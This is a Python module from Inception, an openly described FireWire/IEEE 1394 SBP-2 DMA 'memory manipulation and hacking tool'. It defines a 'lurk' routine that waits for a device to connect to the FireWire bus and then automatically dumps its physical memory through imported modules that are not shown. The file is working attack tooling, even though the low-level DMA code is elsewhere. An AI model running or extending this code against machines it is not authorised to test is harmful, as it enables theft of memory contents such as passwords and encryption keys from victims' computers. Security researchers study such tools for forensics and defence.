'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Feb 1, 2012

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''

from inception import firewire, memdump, cfg, term
import time

def lurk():
    '''
    Wait for devices to connect to the FireWire bus, and attack when they do
    '''
    start = cfg.startaddress
    end = cfg.memsize
    bb = term.BeachBall()
    
    try:
        s = '\n'.join(term.wrapper.wrap('[-] Lurking in the shrubbery ' +
                                        'waiting for a device to connect. ' +
                                        'Ctrl-C to abort')) + '\r'
        print(s, end = '')
        
        # Initiate FireWire
        fw = firewire.FireWire()
        while True: # Loop until aborted, and poll for devices
            while len(fw.devices) == 0:
                # Draw a beach ball while waiting
                bb.draw()
                time.sleep(cfg.polldelay)

            print() # Newline 
            term.info('FireWire device detected')
            memdump.dump(start, end)
            
    except KeyboardInterrupt:
        print() # TODO: Fix keyboard handling (interrupt handling)
        raise KeyboardInterrupt
        
